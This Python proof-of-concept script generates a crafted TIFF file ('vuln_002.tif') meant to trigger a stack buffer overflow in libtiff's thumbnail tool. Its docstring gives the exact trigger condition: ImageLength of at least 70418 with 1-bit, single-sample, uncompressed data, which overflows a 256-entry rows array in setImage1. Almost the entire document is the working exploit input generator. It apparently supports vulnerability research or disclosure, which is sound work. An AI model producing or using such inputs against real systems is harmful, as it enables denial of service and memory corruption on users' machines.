#!/usr/bin/env python3
"""
PoC generator for VULN 002: Stack Buffer Overflow via rows[] Array OOB in setImage1
Target: libtiff thumbnail tool, thumbnail.c lines 523-532

Vulnerability:
  setImage1() declares `const uint8* rows[256]` on the stack.
  With step=rh and limit=tnh (default 274), when rh >= 257*274 = 70418,
  the inner `if (err >= limit)` fires >=256 times in the first outer loop
  iteration, causing rows[256] OOB write -> stack buffer overflow.

TIFF requirements to trigger:
  - bps=1, spp=1   (to pass generateThumbnail check at line 563)
  - ImageLength >= 70418
  - Compression=1  (uncompressed, avoids decompression complexity)
"""

import struct
import math
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.tif")

def make_tiff():
    W = 8          # ImageWidth  (8 pixels wide)
    H = 70418      # ImageLength >= 257*274 to trigger OOB (257*274 = 70418)
    bps = 1        # BitsPerSample = 1
    spp = 1        # SamplesPerPixel = 1

    # Bytes per row for 1-bit image: ceil(W/8)
    bytes_per_row = (W * bps + 7) // 8   # = 1
    total_pixel_bytes = H * bytes_per_row  # = 70418

    # Layout: 8-byte header | IFD | pixel data
    n_entries = 9
    ifd_offset = 8
    ifd_size = 2 + n_entries * 12 + 4    # count + entries + next_ifd
    data_offset = ifd_offset + ifd_size  # = 8 + 114 = 122

    # --- Header (little-endian TIFF) ---
    hdr  = b'II'                             # byte order: little-endian
    hdr += struct.pack('<H', 42)             # TIFF magic
    hdr += struct.pack('<I', ifd_offset)     # offset to first IFD

    # --- IFD entry helpers ---
    def entry_short(tag, value):
        """12-byte IFD entry with SHORT (type=3) value."""
        return struct.pack('<HHI', tag, 3, 1) + struct.pack('<HH', value, 0)

    def entry_long(tag, value):
        """12-byte IFD entry with LONG (type=4) value."""
        return struct.pack('<HHII', tag, 4, 1, value)

    # --- IFD (tags must be in ascending order) ---
    ifd  = struct.pack('<H', n_entries)
    ifd += entry_short(256, W)              # ImageWidth
    ifd += entry_long (257, H)              # ImageLength  <- key: >= 70418
    ifd += entry_short(258, bps)            # BitsPerSample = 1
    ifd += entry_short(259, 1)              # Compression = 1 (None)
    ifd += entry_short(262, 1)              # PhotometricInterpretation = 1
    ifd += entry_long (273, data_offset)    # StripOffsets
    ifd += entry_short(277, spp)            # SamplesPerPixel = 1
    ifd += entry_long (278, H)              # RowsPerStrip = H (single strip)
    ifd += entry_long (279, total_pixel_bytes)  # StripByteCounts
    ifd += struct.pack('<I', 0)             # Next IFD offset = 0 (end)

    assert len(hdr) == 8
    assert len(ifd) == ifd_size, f"ifd len={len(ifd)} expected={ifd_size}"
    assert data_offset == len(hdr) + len(ifd)

    # --- Pixel data (all zeros; 1-bit black image) ---
    pixel_data = bytes(total_pixel_bytes)

    tiff_bytes = hdr + ifd + pixel_data

    with open(OUTPUT, 'wb') as f:
        f.write(tiff_bytes)

    print(f"[+] Written: {OUTPUT}")
    print(f"    File size       : {len(tiff_bytes)} bytes")
    print(f"    ImageWidth      : {W}")
    print(f"    ImageLength     : {H}  (>= 257*274={257*274}  -> OOB trigger)")
    print(f"    BitsPerSample   : {bps}")
    print(f"    SamplesPerPixel : {spp}")
    print(f"    bytes_per_row   : {bytes_per_row}")
    print(f"    pixel data size : {total_pixel_bytes}")
    print(f"    data_offset     : {data_offset}")

if __name__ == '__main__':
    make_tiff()
